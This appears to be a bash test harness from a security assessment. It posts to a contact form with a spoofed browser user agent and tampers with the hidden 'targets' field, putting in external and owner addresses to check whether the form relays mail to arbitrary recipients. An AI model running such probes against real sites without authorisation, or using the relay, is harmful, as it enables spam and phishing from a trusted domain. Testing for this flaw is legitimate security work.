#!/bin/bash
# Independent relay re-verification harness
cd /work/evidence/IVFY_RELAY_INDEP
T=$(head -1 targets.txt)
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

post() {   # $1 = label, $2 = targets value
  echo "----- $1 -----"
  curl -s -i -X POST "$T" \
    -H "User-Agent: $UA" \
    -H "Content-Type: multipart/form-data" \
    -F "fname=Ind" -F "lname=Verif" -F "areacode=973" -F "tel=17100005" \
    -F "cname=Recheck" -F "subject=Media & Press Relations" \
    -F "msg=independent verification message body" \
    -F "check=Ind" -F "targets=$2" \
    --max-time 45 -o "$1.body" -D "$1.hdr"
  echo "status: $(head -1 "$1.hdr")"
  grep -iE '^(x-vercel-id|set-cookie|www-authenticate|x-middleware|x-robots)' "$1.hdr"
  echo "body: $(head -c 700 "$1.body")"
  echo
}

post T1_malformed 'not-an-email'
post T2_external  'verifier-relay-1@discard.email'
post T3_named     'Relay Verifier <verifier-relay-2@discard.email>'
post T4_siteown   'info@infinitycapital.bh'
